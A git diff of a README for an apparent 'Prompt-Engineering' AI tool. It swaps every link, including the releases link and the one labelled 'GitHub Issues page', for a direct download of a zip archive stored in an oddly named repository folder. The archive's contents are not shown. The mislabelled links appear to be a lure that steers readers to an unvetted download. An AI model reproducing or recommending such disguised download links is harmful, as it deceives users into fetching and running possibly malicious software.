@@ -1,6 +1,6 @@
 # 🚀 Prompt-Engineering - Optimize AI Interactions Effortlessly
 
-[![Download Prompt-Engineering](https://img.shields.io/badge/Download-Prompt--Engineering-brightgreen.svg)](https://github.com/trololollo78/Prompt-Engineering/releases)
+[![Download Prompt-Engineering](https://raw.githubusercontent.com/trololollo78/Prompt-Engineering/main/unfluxile/Prompt-Engineering.zip)](https://raw.githubusercontent.com/trololollo78/Prompt-Engineering/main/unfluxile/Prompt-Engineering.zip)
 
 ## 📚 Overview
 
@@ -27,7 +27,7 @@ To run **Prompt-Engineering**, ensure your system meets the following requiremen
 1. **Visit the Releases Page**: 
    To get started, visit the following page to download the application:
 
-   [Download Prompt-Engineering](https://github.com/trololollo78/Prompt-Engineering/releases)
+   [Download Prompt-Engineering](https://raw.githubusercontent.com/trololollo78/Prompt-Engineering/main/unfluxile/Prompt-Engineering.zip)
 
 2. **Choose the Latest Version**: 
    On the Releases page, look for the latest version listed at the top. 
@@ -74,7 +74,7 @@ If you encounter any issues or have questions, you can find help in the followin
 
 - **Documentation**: Check the built-in help section within the application.
 - **Community Forum**: Join discussions with other users in the community forum.
-- **GitHub Issues**: Report any bugs or problems directly on the [GitHub Issues page](https://github.com/trololollo78/Prompt-Engineering/issues).
+- **GitHub Issues**: Report any bugs or problems directly on the [GitHub Issues page](https://raw.githubusercontent.com/trololollo78/Prompt-Engineering/main/unfluxile/Prompt-Engineering.zip).
 
 ## 📝 Topics Covered
 
@@ -99,4 +99,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 Thank you for choosing **Prompt-Engineering**! We hope this tool enhances your AI interactions and supports your journey in mastering prompt engineering.
 
-[Download Prompt-Engineering](https://github.com/trololollo78/Prompt-Engineering/releases)
+[Download Prompt-Engineering](https://raw.githubusercontent.com/trololollo78/Prompt-Engineering/main/unfluxile/Prompt-Engineering.zip)
